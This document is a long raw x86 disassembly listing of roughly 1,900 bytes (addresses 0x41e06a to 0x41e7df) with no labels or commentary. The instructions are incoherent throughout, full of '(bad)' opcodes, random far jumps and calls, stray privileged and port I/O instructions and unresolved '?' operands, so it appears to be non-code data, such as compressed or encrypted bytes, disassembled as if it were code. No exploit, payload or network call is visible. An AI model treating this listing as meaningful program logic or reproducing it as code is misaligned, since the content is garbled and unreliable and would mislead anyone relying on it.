  41e06a:	enter  0xb49a,0x56
  41e06e:	sahf   
  41e06f:	push   esi
  41e070:	stos   BYTE PTR es:[edi],al
  41e071:	xchg   edx,eax
  41e072:	scas   al,BYTE PTR es:[edi]
  41e073:	mov    BYTE PTR [ecx-0x4e],al
  41e076:	shr    cl,cl
  41e078:	xor    al,0xe5
  41e07a:	xor    ebp,DWORD PTR [ebp+0x26]
  41e07d:	popa   
  41e07e:	inc    esi
  41e07f:	clc    
  41e080:	leave  
  41e081:	mov    eax,ds:0xf6b2922b
  41e086:	rcr    DWORD PTR [esi-0x5907c03],0xed
  41e08d:	call   0x1283c8a5
  41e092:	and    dh,BYTE PTR [edx+0x49]
  41e095:	ja     0x41e098
  41e097:	or     cl,BYTE PTR [ebx+0x3e702551]
  41e09d:	adc    esi,DWORD PTR gs:[edi+0x76822f77]
  41e0a4:	xchg   edi,eax
  41e0a5:	and    eax,0x341fc6a5
  41e0aa:	or     ecx,eax
  41e0ac:	pop    ebp
  41e0ad:	adc    bl,ah
  41e0af:	cwde   
  41e0b0:	push   ebx
  41e0b1:	jg     0x41e06c
  41e0b3:	sub    eax,0x96f6f8d5
  41e0b8:	mov    al,ds:0xda85c49a
  41e0bd:	imul   DWORD PTR [esi-0x7f]
  41e0c0:	adc    dh,al
  41e0c2:	ret    
  41e0c3:	je     0x41e0ff
  41e0c5:	loopne 0x41e10f
  41e0c7:	sbb    dh,BYTE PTR [edx]
  41e0c9:	jmp    0x99c6:0x97e8ac8f
  41e0d0:	cli    
  41e0d1:	fadd   QWORD PTR [esi]
  41e0d3:	mov    eax,0xb5f4f001
  41e0d8:	xor    edi,DWORD PTR [edx+0x5b]
  41e0db:	pop    ebp
  41e0dc:	adc    BYTE PTR [ebp+0xa34509a],dl
  41e0e2:	adc    ebx,0x42
  41e0e5:	ficomp DWORD PTR [ebp+0x65]
  41e0e8:	xchg   BYTE PTR [edx-0x2c5ac1f2],dl
  41e0ee:	mov    ebp,0xdd2dafbe
  41e0f3:	loop   0x41e0b4
  41e0f5:	or     al,0x8a
  41e0f7:	jp     0x41e0d6
  41e0f9:	retf   
  41e0fa:	inc    edx
  41e0fb:	or     DWORD PTR [ecx],esi
  41e0fd:	jae    0x41e0d6
  41e0ff:	fs aaa 
  41e101:	(bad)  
  41e102:	xchg   esi,eax
  41e103:	push   ebx
  41e104:	fisubr WORD PTR [eax-0x20]
  41e107:	ins    BYTE PTR es:[edi],dx
  41e108:	and    BYTE PTR [edx],0x36
  41e10b:	or     BYTE PTR [esi-0x67b04e85],ah
  41e111:	cli    
  41e112:	pop    ebx
  41e113:	push   esi
  41e114:	sbb    al,0xbf
  41e116:	push   edx
  41e117:	arpl   WORD PTR [eax+eiz*1-0x16],dx
  41e11b:	cmp    bh,BYTE PTR [edx+0xecf2749]
  41e121:	scas   al,BYTE PTR es:[edi]
  41e122:	jne    0x41e18d
  41e124:	adc    ah,BYTE PTR [edx]
  41e126:	or     bl,BYTE PTR ds:0xba16dc0c
  41e12d:	push   esi
  41e12e:	mov    dh,0xeb
  41e130:	xchg   ebp,eax
  41e131:	add    al,0xaf
  41e133:	cs push eax
  41e135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e136:	stc    
  41e137:	sbb    DWORD PTR [ebx-0x7a325e95],ecx
  41e13d:	ds inc ebx
  41e13f:	sbb    eax,0xaed3214c
  41e144:	(bad)
  41e147:	or     al,BYTE PTR [edi+eax*1]
  41e14a:	cld    
  41e14b:	add    BYTE PTR [esi],0xf1
  41e14e:	sahf   
  41e14f:	sub    al,0xe0
  41e151:	mov    ebx,0xc3f8c42e
  41e156:	jae    0x41e176
  41e158:	mov    cl,0x8b
  41e15a:	jb     0x41e170
  41e15c:	adc    esi,DWORD PTR [esi+0x74]
  41e15f:	stos   BYTE PTR es:[edi],al
  41e160:	inc    edx
  41e161:	inc    esi
  41e162:	push   eax
  41e163:	and    DWORD PTR [esi+0x44e97aa1],ecx
  41e169:	sub    cl,BYTE PTR [ebp+0x5bb7912c]
  41e16f:	xchg   ecx,eax
  41e170:	xchg   esp,eax
  41e171:	mov    edx,0xd7bc657f
  41e176:	ins    DWORD PTR es:[edi],dx
  41e177:	xchg   ecx,eax
  41e178:	lods   eax,DWORD PTR ds:[esi]
  41e179:	test   eax,0xa8abc730
  41e17e:	xchg   edx,eax
  41e17f:	mov    esi,0xed56cd0d
  41e184:	xchg   ebp,eax
  41e185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e187:	aas    
  41e188:	pushf  
  41e189:	jecxz  0x41e19c
  41e18b:	ss mov edi,0x9caa1ee0
  41e191:	jle    0x41e12f
  41e193:	inc    esp
  41e194:	in     eax,dx
  41e195:	jnp    0x41e208
  41e197:	dec    esi
  41e198:	dec    eax
  41e199:	rol    DWORD PTR [eax],cl
  41e19b:	test   DWORD PTR [ebx],0xb316862b
  41e1a1:	pop    es
  41e1a2:	jo     0x41e1b8
  41e1a4:	mov    DWORD PTR [edi+0x65216c85],edx
  41e1aa:	cmp    al,BYTE PTR [ecx-0x52]
  41e1ad:	bound  esp,QWORD PTR [ecx+0x62d38317]
  41e1b3:	jg     0x41e163
  41e1b5:	in     eax,dx
  41e1b6:	cmp    al,0xc4
  41e1b8:	jmp    0x97a5:0x2bbe6304
  41e1bf:	mov    esp,0xc91cf59e
  41e1c4:	repnz and DWORD PTR [esi],ecx
  41e1c7:	inc    ebp
  41e1c8:	pushf  
  41e1c9:	xor    BYTE PTR [edi-0x23431f96],bh
  41e1cf:	ins    BYTE PTR es:[edi],dx
  41e1d0:	arpl   WORD PTR [edi],cx
  41e1d2:	dec    DWORD PTR [edx+0x3777d45e]
  41e1d8:	out    dx,eax
  41e1d9:	adc    ebx,DWORD PTR [ebp+0xe5c2a52]
  41e1df:	cmp    al,0x12
  41e1e1:	dec    esi
  41e1e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1e3:	mov    ah,0xb4
  41e1e5:	push   ebx
  41e1e6:	dec    edi
  41e1e7:	fwait
  41e1e8:	int3   
  41e1e9:	inc    dl
  41e1eb:	dec    ecx
  41e1ec:	int3   
  41e1ed:	xchg   ecx,eax
  41e1ee:	pop    ebx
  41e1ef:	adc    eax,0x5321b093
  41e1f4:	jmp    0x41e191
  41e1f6:	pop    ecx
  41e1f7:	dec    ecx
  41e1f8:	jne    0x41e1c6
  41e1fa:	push   ss
  41e1fb:	push   0x5c477140
  41e200:	stos   BYTE PTR es:[edi],al
  41e201:	and    esp,DWORD PTR [ebp+0x5539f33d]
  41e207:	xor    esp,DWORD PTR [esi-0x8]
  41e20a:	add    al,0x49
  41e20c:	repz out 0xb5,eax
  41e20f:	rcl    dh,cl
  41e211:	push   eax
  41e212:	ds cmp al,bh
  41e215:	add    al,0xde
  41e217:	mov    bh,0x5e
  41e219:	call   0x9ad2:0x2dfb94b4
  41e220:	(bad)  
  41e222:	call   0xdfc5:0x41d7143a
  41e229:	scas   al,BYTE PTR es:[edi]
  41e22a:	clc    
  41e22b:	sbb    ebp,DWORD PTR [edi+0x59d82864]
  41e231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e232:	sub    DWORD PTR [esi+0x68],ebx
  41e235:	sbb    al,0xe
  41e237:	and    DWORD PTR [edi-0x4ef475ae],0xffffff8b
  41e23e:	and    BYTE PTR [edx],dl
  41e240:	fidivr WORD PTR [eax]
  41e242:	mov    cl,0x8c
  41e244:	add    DWORD PTR [esi],edi
  41e246:	mov    edx,cs
  41e248:	int    0x19
  41e24a:	or     eax,0x5023ccac
  41e24f:	jmp    0xcbabf1ab
  41e254:	cmp    al,0xc8
  41e256:	sub    eax,0xb9fe4169
  41e25b:	push   0xffffff92
  41e25d:	adc    eax,0x867858c
  41e262:	and    dl,BYTE PTR [ebp+0x28f876f3]
  41e268:	lods   eax,DWORD PTR ds:[esi]
  41e269:	adc    ch,dh
  41e26b:	fisubr WORD PTR [edx-0x23f06fdd]
  41e271:	in     eax,0xbd
  41e273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e274:	mov    al,0x56
  41e276:	inc    ecx
  41e277:	mov    eax,ebx
  41e279:	adc    BYTE PTR [edi+edx*2-0x4],bh
  41e27d:	or     BYTE PTR [ebp-0x1a],dl
  41e280:	loop   0x41e265
  41e282:	mov    al,ds:0x9e250feb
  41e287:	es dec ecx
  41e289:	mov    WORD PTR [ecx+0x46f97ef8],?
  41e28f:	or     DWORD PTR fs:[esi+ecx*2],0x6b054701
  41e297:	adc    eax,0x3d4a2671
  41e29c:	pop    ebp
  41e29d:	test   bl,0x6e
  41e2a0:	cmp    bh,BYTE PTR [edx+0xab435bf]
  41e2a6:	pop    ds
  41e2a7:	and    BYTE PTR [ebx],cl
  41e2a9:	test   DWORD PTR [ebp-0x79],esi
  41e2ac:	(bad)  
  41e2ad:	xor    cl,BYTE PTR [ebp-0x19561316]
  41e2b3:	scas   al,BYTE PTR es:[edi]
  41e2b4:	popf   
  41e2b5:	fadd   st,st(1)
  41e2b7:	dec    eax
  41e2b8:	cs dec ebx
  41e2ba:	popa   
  41e2bb:	jecxz  0x41e2bc
  41e2bd:	xchg   edx,eax
  41e2be:	and    eax,0x94c45bab
  41e2c3:	pop    esp
  41e2c4:	cmc    
  41e2c5:	adc    DWORD PTR [ecx-0x1f],eax
  41e2c8:	jge    0x41e30d
  41e2ca:	cmp    al,0xfb
  41e2cc:	cmp    al,0x25
  41e2ce:	jnp    0x41e342
  41e2d0:	outs   dx,DWORD PTR ds:[esi]
  41e2d1:	stc    
  41e2d2:	in     eax,dx
  41e2d3:	dec    ebp
  41e2d4:	sub    al,0x39
  41e2d6:	mov    ecx,0x4e4b1929
  41e2db:	lods   eax,DWORD PTR ds:[esi]
  41e2dc:	jb     0x41e277
  41e2de:	out    dx,al
  41e2df:	jmp    0x85f56431
  41e2e4:	data16 xor al,0x90
  41e2e7:	icebp  
  41e2e8:	xchg   esi,eax
  41e2e9:	hlt    
  41e2ea:	ins    BYTE PTR es:[edi],dx
  41e2eb:	adc    dl,BYTE PTR [eax+0x3551ea13]
  41e2f1:	stos   BYTE PTR es:[edi],al
  41e2f2:	xchg   edx,eax
  41e2f3:	test   DWORD PTR [ebx],0xaa26b186
  41e2f9:	inc    edi
  41e2fa:	push   es
  41e2fb:	xor    esp,DWORD PTR ss:[ebx]
  41e2fe:	lea    edx,[esi-0x2e]
  41e301:	test   edi,edi
  41e303:	and    bh,al
  41e305:	adc    DWORD PTR [ebx+0x4a7010c8],edi
  41e30b:	pop    edi
  41e30c:	sbb    ecx,edx
  41e30e:	jle    0x41e379
  41e310:	out    dx,al
  41e311:	sbb    DWORD PTR [ebx-0x65446c8],esi
  41e317:	mov    al,0xde
  41e319:	pop    ebp
  41e31a:	jp     0x41e2e1
  41e31c:	dec    eax
  41e31d:	les    ecx,FWORD PTR [ebx-0x4ba685bb]
  41e323:	std    
  41e324:	or     BYTE PTR [ecx],ah
  41e326:	cmc    
  41e327:	iret   
  41e328:	push   ebx
  41e329:	in     eax,dx
  41e32a:	repnz std 
  41e32c:	pop    esp
  41e32d:	push   0xba7243e0
  41e332:	jg     0x41e2c1
  41e334:	fisubr WORD PTR [ecx+0x2]
  41e337:	mov    esp,0xfec77fda
  41e33c:	cmp    DWORD PTR [ebp-0x1b2d69a8],eax
  41e342:	ins    BYTE PTR es:[edi],dx
  41e343:	cmp    al,0x47
  41e345:	jne    0x41e2f5
  41e347:	add    esi,DWORD PTR [ebx]
  41e349:	lods   al,BYTE PTR ds:[esi]
  41e34a:	sbb    BYTE PTR [eax+0x4a48594d],cl
  41e350:	pop    ebx
  41e351:	lds    esi,FWORD PTR [ecx-0x1f]
  41e354:	sbb    BYTE PTR [ebx+0x29893ea0],0x33
  41e35b:	cmc    
  41e35c:	pop    esp
  41e35d:	ins    DWORD PTR es:[edi],dx
  41e35e:	cdq    
  41e35f:	mov    edx,ebp
  41e361:	and    BYTE PTR [eax-0x53512860],bh
  41e367:	xchg   edi,eax
  41e368:	pop    ecx
  41e369:	adc    eax,DWORD PTR [ebx]
  41e36b:	jns    0x41e368
  41e36d:	fidiv  WORD PTR [ecx+0x79]
  41e370:	clc    
  41e371:	dec    ebp
  41e372:	jmp    0x41e34a
  41e374:	jnp    0x41e2fd
  41e376:	mov    bl,0xd0
  41e378:	ja     0x41e393
  41e37a:	sbb    ecx,DWORD PTR [edx+esi*4-0x66825051]
  41e381:	sub    al,0x28
  41e383:	xchg   esp,eax
  41e384:	fcmovnb st,st(5)
  41e386:	mov    ds:0x2efc3732,eax
  41e38b:	sbb    al,0x6a
  41e38d:	enter  0x945f,0xcb
  41e391:	jmp    0x2a3c:0x22a1bb72
  41e398:	pop    edx
  41e399:	cld    
  41e39a:	mov    bl,0x56
  41e39c:	outs   dx,DWORD PTR ds:[esi]
  41e39d:	mov    al,0x42
  41e39f:	pop    edi
  41e3a0:	stos   BYTE PTR es:[edi],al
  41e3a1:	cs push ebp
  41e3a3:	and    dl,cl
  41e3a5:	xor    BYTE PTR [ebx-0x55],dh
  41e3a8:	sbb    al,0xb2
  41e3aa:	push   ds
  41e3ab:	shl    bl,1
  41e3ad:	in     al,dx
  41e3ae:	jno    0x41e331
  41e3b0:	sub    eax,0x855884ab
  41e3b5:	int3   
  41e3b6:	jno    0x41e3f1
  41e3b8:	mov    edx,0xbd13672d
  41e3bd:	ja     0x41e349
  41e3bf:	sbb    al,0xc5
  41e3c1:	aad    0x2d
  41e3c3:	or     ch,dl
  41e3c5:	ds nop
  41e3c7:	cmp    ecx,DWORD PTR [esi+esi*2]
  41e3ca:	bound  ebx,QWORD PTR [ebp-0x4a]
  41e3cd:	gs test eax,0x90ee14ca
  41e3d3:	rcr    DWORD PTR [ebp-0xe],cl
  41e3d6:	rcl    DWORD PTR [ebx+0x33e7d50b],cl
  41e3dc:	cmc    
  41e3dd:	push   esi
  41e3de:	int3   
  41e3df:	mov    ds:0x3207fefb,eax
  41e3e4:	and    ebx,0x3fb6bc3a
  41e3ea:	xchg   ecx,eax
  41e3eb:	idiv   DWORD PTR [ebx+0x68]
  41e3ee:	popa   
  41e3ef:	in     al,0xbe
  41e3f1:	sub    eax,0x12b3b6b
  41e3f6:	adc    al,0x46
  41e3f8:	dec    BYTE PTR [edi+0x16a36631]
  41e3fe:	jl     0x41e43e
  41e400:	fdivrp st(5),st
  41e402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e403:	jecxz  0x41e427
  41e405:	jle    0x41e40d
  41e407:	inc    edi
  41e408:	iret   
  41e409:	lds    ebp,FWORD PTR [bp-0x31]
  41e40d:	shr    DWORD PTR [eax-0x4cbe44a],cl
  41e413:	test   DWORD PTR [bp+si+0x3517],eax
  41e418:	jecxz  0x41e3dd
  41e41a:	and    BYTE PTR ss:[ecx-0x35],bh
  41e41e:	inc    esi
  41e41f:	mov    edi,0x5fed74fb
  41e424:	aad    0xc0
  41e426:	(bad)  
  41e427:	in     al,dx
  41e428:	(bad)  
  41e429:	outs   dx,DWORD PTR ds:[esi]
  41e42a:	aad    0xb5
  41e42c:	pop    ebp
  41e42d:	mov    edi,0xbf603935
  41e432:	add    ebx,DWORD PTR [edx]
  41e434:	cmp    DWORD PTR [ebx+0x4ed55a96],edi
  41e43a:	push   es
  41e43b:	scas   eax,DWORD PTR es:[edi]
  41e43c:	push   ebx
  41e43d:	pop    ebx
  41e43e:	ss pop edx
  41e440:	cmp    al,0xe7
  41e442:	shl    BYTE PTR [edi-0x7f],1
  41e445:	jl     0x41e3da
  41e447:	int    0x2c
  41e449:	fs dec esi
  41e44b:	pop    ds
  41e44c:	and    ch,BYTE PTR [esi]
  41e44e:	mov    eax,ds:0xe4da639a
  41e453:	(bad)  
  41e455:	mov    ebx,0x3ddae31b
  41e45a:	loop   0x41e4aa
  41e45c:	mov    dh,0xd
  41e45e:	add    BYTE PTR [ebx],bl
  41e460:	push   edi
  41e461:	xchg   esi,eax
  41e462:	retf   0x2456
  41e465:	mul    DWORD PTR [eax-0x702b82bb]
  41e46b:	cdq    
  41e46c:	test   DWORD PTR [ebx],edi
  41e46e:	xchg   esi,eax
  41e46f:	xor    al,cl
  41e471:	xchg   ebx,eax
  41e472:	enter  0x76cc,0xb3
  41e476:	cwde   
  41e477:	(bad)  
  41e478:	and    DWORD PTR [edi],ecx
  41e47a:	push   eax
  41e47b:	add    eax,0x910a15d1
  41e480:	jbe    0x41e44f
  41e482:	mov    WORD PTR [esi],es
  41e484:	mov    edi,0xc99860bb
  41e489:	and    ecx,edx
  41e48b:	gs nop
  41e48d:	inc    edx
  41e48e:	jmp    0x41e4c3
  41e490:	push   eax
  41e491:	push   0x64e76b04
  41e496:	cmp    BYTE PTR [ebp+0x53],bl
  41e499:	xchg   esi,eax
  41e49a:	(bad)  
  41e49c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e49d:	ds dec esp
  41e49f:	push   ss
  41e4a0:	int3   
  41e4a1:	test   al,0x31
  41e4a3:	mov    esi,DWORD PTR [ebp+0x74158488]
  41e4a9:	xchg   esp,eax
  41e4aa:	jbe    0x41e4b6
  41e4ac:	push   cs
  41e4ad:	xchg   esp,eax
  41e4ae:	adc    eax,0x67925f8
  41e4b3:	enter  0x9266,0x34
  41e4b7:	adc    esp,0xdcbb19b3
  41e4bd:	fwait
  41e4be:	mov    ebx,0x458d4abf
  41e4c3:	int3   
  41e4c4:	aad    0xbf
  41e4c6:	sbb    cl,al
  41e4c8:	mov    bl,0x5d
  41e4ca:	repnz inc esp
  41e4cc:	jns    0x41e521
  41e4ce:	jge    0x41e48f
  41e4d0:	push   ebx
  41e4d1:	fisubr DWORD PTR [esi]
  41e4d3:	mov    edx,DWORD PTR [ebx+0x17]
  41e4d6:	fldcw  WORD PTR [esi+esi*1-0x4b3b7809]
  41e4dd:	inc    ecx
  41e4de:	push   0x9bc3c49c
  41e4e3:	push   ds
  41e4e4:	lds    ecx,FWORD PTR [ecx]
  41e4e6:	fsub   DWORD PTR [esi+0x3f]
  41e4e9:	ins    DWORD PTR es:[edi],dx
  41e4ea:	fs inc edi
  41e4ec:	push   0xffffffcd
  41e4ee:	adc    DWORD PTR [ebx-0x725a5767],edi
  41e4f4:	xor    DWORD PTR [edi-0x5ae49cfd],edx
  41e4fa:	mov    ds:0x9b79bb7e,eax
  41e4ff:	add    eax,0xd89018c7
  41e504:	call   0xa41:0xd5217489
  41e50b:	in     al,0xac
  41e50d:	pop    edx
  41e50e:	rcr    BYTE PTR [eax-0x70640a9d],cl
  41e514:	lahf   
  41e515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e516:	xor    DWORD PTR [esi-0x5c88e7a0],ebx
  41e51c:	sahf   
  41e51d:	and    cl,bh
  41e51f:	xor    DWORD PTR [ebx],eax
  41e521:	icebp  
  41e522:	ds mov edx,0x80cb0cc8
  41e528:	xor    BYTE PTR [edx+ecx*4],bl
  41e52b:	data16 sub BYTE PTR [eax+0x40],0xe6
  41e530:	sti    
  41e531:	enter  0xbe,0xc3
  41e535:	and    BYTE PTR [edx],bl
  41e537:	das    
  41e538:	sub    al,cl
  41e53a:	inc    edi
  41e53b:	cwde   
  41e53c:	push   edi
  41e53d:	pusha  
  41e53e:	outs   dx,DWORD PTR ds:[esi]
  41e53f:	mov    ecx,0x95493bc9
  41e544:	stos   DWORD PTR es:[edi],eax
  41e545:	jnp    0x41e549
  41e547:	call   0x2ea36a76
  41e54c:	pop    esp
  41e54d:	idiv   BYTE PTR [ebx+0x70b1cd98]
  41e553:	arpl   WORD PTR [eax+0x63],bp
  41e556:	das    
  41e557:	inc    ebp
  41e558:	mov    ?,WORD PTR [esi-0x15]
  41e55b:	imul   eax,DWORD PTR [edx],0x47367dd4
  41e561:	sub    dh,BYTE PTR [esi]
  41e563:	jb     0x41e596
  41e565:	repz add DWORD PTR [eax-0x61],ebx
  41e569:	mov    bl,0x94
  41e56b:	mov    ah,BYTE PTR [esi+ebp*4+0x27950e5f]
  41e572:	inc    ecx
  41e573:	xor    eax,0x92de37d
  41e578:	push   cs
  41e579:	adc    eax,0x2d76f8c7
  41e57e:	mov    al,ds:0xbfc9dc8b
  41e583:	aaa    
  41e584:	xor    ch,ah
  41e586:	mov    dl,0x62
  41e588:	inc    esp
  41e589:	xor    BYTE PTR [edx+0x720962ce],0x1e
  41e590:	cli    
  41e591:	and    BYTE PTR [esp+ecx*1],dh
  41e594:	fcom   QWORD PTR [eax]
  41e596:	fdivr  st,st(6)
  41e598:	(bad)  
  41e599:	fadd   st(3),st
  41e59b:	pop    edx
  41e59c:	ret    0x7944
  41e59f:	frstor [ecx+0x21f55268]
  41e5a5:	int    0x47
  41e5a7:	addr16 xor eax,0x9e8c6e4e
  41e5ad:	(bad)  [edx]
  41e5af:	retf   0x2897
  41e5b2:	pop    es
  41e5b3:	push   edx
  41e5b4:	iret   
  41e5b5:	jne    0x41e5da
  41e5b7:	add    DWORD PTR [ebp-0x3396b342],edx
  41e5bd:	inc    ecx
  41e5be:	loop   0x41e5eb
  41e5c0:	sar    DWORD PTR [ebx],1
  41e5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5c3:	data16 adc BYTE PTR [edx+0x6a9ba292],bl
  41e5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5cb:	mov    dh,0x7b
  41e5cd:	xor    eax,0x304be049
  41e5d2:	adc    al,BYTE PTR [ebp-0x72]
  41e5d5:	je     0x41e5f1
  41e5d7:	aas    
  41e5d8:	aaa    
  41e5d9:	int    0x37
  41e5db:	push   ds
  41e5dc:	rol    BYTE PTR [edx-0x79],cl
  41e5df:	add    eax,0x380e9693
  41e5e4:	and    dl,ah
  41e5e6:	sub    eax,0x85861ea0
  41e5eb:	add    BYTE PTR [ebx+edi*1],ch
  41e5ee:	sub    ch,BYTE PTR [edx-0x48486bf0]
  41e5f4:	outs   dx,DWORD PTR ds:[esi]
  41e5f5:	sub    ah,BYTE PTR [ecx+eiz*4]
  41e5f8:	sub    eax,0x7da1f84c
  41e5fd:	xor    al,0x11
  41e5ff:	jmp    0x41e5e6
  41e601:	sub    BYTE PTR [ebx-0x27],bl
  41e604:	cdq    
  41e605:	cwde   
  41e606:	dec    esp
  41e607:	lods   eax,DWORD PTR ds:[esi]
  41e608:	(bad)  
  41e609:	jae    0x41e625
  41e60b:	jle    0x41e5a2
  41e60d:	fisttp DWORD PTR [ecx+0x32]
  41e610:	and    al,0xb3
  41e612:	jnp    0x41e649
  41e614:	jbe    0x41e670
  41e616:	mov    ch,0x63
  41e618:	cmp    eax,0x98f4bed9
  41e61d:	dec    ebx
  41e61e:	cld    
  41e61f:	sbb    al,0x1e
  41e621:	enter  0xcff5,0x8e
  41e625:	add    BYTE PTR [eax+0x63f12138],bh
  41e62b:	and    DWORD PTR ds:0x45a9ec8e,ebp
  41e631:	aas    
  41e632:	cmp    dh,ch
  41e634:	sub    dh,BYTE PTR [ecx-0x6405115]
  41e63a:	into   
  41e63b:	bound  ebx,QWORD PTR [edi-0x39]
  41e63e:	cmp    BYTE PTR [ecx+0x1e],al
  41e641:	unpckhps xmm3,XMMWORD PTR [ecx]
  41e644:	aam    0xd1
  41e646:	sbb    al,0x8b
  41e648:	(bad)  
  41e649:	loopne 0x41e62c
  41e64b:	fadd   st(3),st
  41e64d:	std    
  41e64e:	rcl    DWORD PTR [ecx-0x27],0x5a
  41e652:	(bad)  
  41e653:	mov    ecx,0xa3b308b9
  41e658:	jne    0x41e678
  41e65a:	adc    al,dh
  41e65c:	pop    edi
  41e65d:	jmp    0x8024:0x22368820
  41e664:	inc    eax
  41e665:	es nop
  41e667:	stos   DWORD PTR es:[edi],eax
  41e668:	addr16 retf 
  41e66a:	rcl    DWORD PTR [esi+0x6a],cl
  41e66d:	jl     0x41e6b3
  41e66f:	loopne 0x41e6ab
  41e671:	and    BYTE PTR [ebp+0x69],cl
  41e674:	scas   al,BYTE PTR es:[edi]
  41e675:	push   0xffffffbf
  41e677:	inc    edi
  41e678:	push   ebx
  41e679:	fucomip st,st(3)
  41e67b:	or     dh,dl
  41e67d:	cmp    edx,DWORD PTR [esi+0x6e]
  41e680:	adc    esp,esi
  41e682:	int3   
  41e683:	dec    ebp
  41e684:	out    0x59,al
  41e686:	(bad)  
  41e688:	pop    edx
  41e689:	or     eax,0xf1eca285
  41e68e:	mov    ebp,0x5a510daf
  41e693:	xchg   ecx,eax
  41e694:	mov    edi,0x2a3e856d
  41e699:	cwde   
  41e69a:	or     cl,BYTE PTR [ecx+0x6a437d73]
  41e6a0:	jmp    0x41e6e7
  41e6a2:	pop    ebx
  41e6a3:	jge    0x41e696
  41e6a5:	pop    ds
  41e6a6:	pop    eax
  41e6a7:	push   eax
  41e6a8:	jmp    0xfca8:0x4bf2c3fb
  41e6af:	push   eax
  41e6b0:	in     al,0x18
  41e6b2:	jns    0x41e65e
  41e6b4:	imul   edi,DWORD PTR [ebp-0x2],0x59
  41e6b8:	push   esi
  41e6b9:	fidiv  WORD PTR [ebx]
  41e6bb:	jle    0x41e6fa
  41e6bd:	(bad)  
  41e6be:	mov    eax,ds:0xb7d21941
  41e6c3:	ins    DWORD PTR es:[edi],dx
  41e6c4:	adc    BYTE PTR [eax],ch
  41e6c6:	retf   0x2de0
  41e6c9:	aad    0x3c
  41e6cb:	adc    eax,0xf7088683
  41e6d0:	ret    0x2891
  41e6d3:	dec    ebx
  41e6d4:	out    dx,al
  41e6d5:	imul   DWORD PTR [edi]
  41e6d7:	sti    
  41e6d8:	dec    edi
  41e6d9:	pop    DWORD PTR [edi-0xb]
  41e6dc:	mov    al,ds:0x8e39b168
  41e6e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6e2:	mov    dh,0xe0
  41e6e4:	(bad)  
  41e6e5:	aam    0x63
  41e6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6e8:	shl    BYTE PTR [esp+esi*4+0x76624499],cl
  41e6ef:	(bad)  
  41e6f0:	iret   
  41e6f1:	pop    esp
  41e6f2:	retf   0x385b
  41e6f5:	in     al,0xaa
  41e6f7:	es gs cli 
  41e6fa:	inc    ebp
  41e6fb:	mov    dh,BYTE PTR [eax]
  41e6fd:	shld   DWORD PTR [esi+edx*8-0x21],esp,cl
  41e702:	in     eax,dx
  41e703:	lods   al,BYTE PTR ds:[esi]
  41e704:	fldcw  WORD PTR [esi+0x46]
  41e707:	retf   
  41e708:	addr16 mov ebp,0x93ad544b
  41e70e:	js     0x41e693
  41e710:	fmul   DWORD PTR ds:[ebx]
  41e713:	retf   0x64c8
  41e716:	mov    dl,0xf6
  41e718:	and    al,0x28
  41e71a:	cmp    al,0x20
  41e71c:	jne    0x41e6fe
  41e71e:	xchg   esi,eax
  41e71f:	dec    eax
  41e720:	inc    eax
  41e721:	sub    ah,BYTE PTR [ebx]
  41e723:	mov    edx,0xadcc7af1
  41e728:	adc    eax,0xd7097cbd
  41e72d:	pop    ebx
  41e72e:	adc    eax,0x29f2894e
  41e733:	sbb    DWORD PTR [ebp-0x5f],ebp
  41e736:	push   DWORD PTR fs:[edx+edx*2]
  41e73a:	push   ebx
  41e73b:	jle    0x41e794
  41e73d:	push   edx
  41e73e:	xchg   ebp,eax
  41e73f:	cmp    bl,ah
  41e741:	xchg   ebx,eax
  41e742:	adc    dh,BYTE PTR [ecx+0x6244ac1]
  41e748:	les    eax,FWORD PTR [ebp-0x4204d6b3]
  41e74e:	jecxz  0x41e74f
  41e750:	mov    edx,0xa5fe33e8
  41e755:	xchg   edi,eax
  41e756:	cli    
  41e757:	bound  edi,QWORD PTR [esi-0x49]
  41e75a:	out    0xcb,eax
  41e75c:	bswap  esp
  41e75e:	sub    al,0xcc
  41e760:	inc    ecx
  41e761:	xchg   BYTE PTR [eax-0x60],bl
  41e764:	sbb    al,bl
  41e766:	ins    DWORD PTR es:[edi],dx
  41e767:	sub    DWORD PTR cs:[esi],edx
  41e76a:	inc    edx
  41e76b:	or     esi,DWORD PTR [ebp+0x3d636b17]
  41e771:	mov    ah,cl
  41e773:	inc    ebp
  41e774:	sub    al,0x40
  41e776:	loopne 0x41e7d7
  41e778:	int    0x5b
  41e77a:	sahf   
  41e77b:	sbb    dh,BYTE PTR [eax-0x73cb1747]
  41e781:	add    eax,0x2ca8c1ce
  41e786:	call   0x8009e132
  41e78b:	mov    BYTE PTR [eax],bh
  41e78d:	mov    esp,0x2ac637f3
  41e792:	mov    ebx,DWORD PTR [ebp-0x7c33c9f1]
  41e798:	or     ebp,DWORD PTR [esi+ecx*2+0x2409ed0c]
  41e79f:	add    ah,BYTE PTR [esi]
  41e7a1:	sub    eax,0xba7fec4
  41e7a6:	jbe    0x41e732
  41e7a8:	in     eax,0x2e
  41e7aa:	popf   
  41e7ab:	add    DWORD PTR [ecx-0x69f058c6],ebp
  41e7b1:	xor    DWORD PTR [edx-0x7ca5858f],ebp
  41e7b7:	adc    ecx,DWORD PTR [edi+0x26b4e729]
  41e7bd:	dec    edi
  41e7be:	ror    DWORD PTR [ecx+edx*8+0x7bb4d7a1],1
  41e7c5:	dec    edi
  41e7c6:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7c8:	dec    ebx
  41e7c9:	sbb    eax,0x7fbd7db4
  41e7ce:	in     al,dx
  41e7cf:	inc    eax
  41e7d0:	adc    eax,0x1c2bb842
  41e7d5:	cmp    al,0x52
  41e7d7:	shl    BYTE PTR [edx],1
  41e7d9:	mov    edi,0xa959787c
  41e7de:	stos   DWORD PTR es:[edi],eax
  41e7df:	xchg   ecx,eax
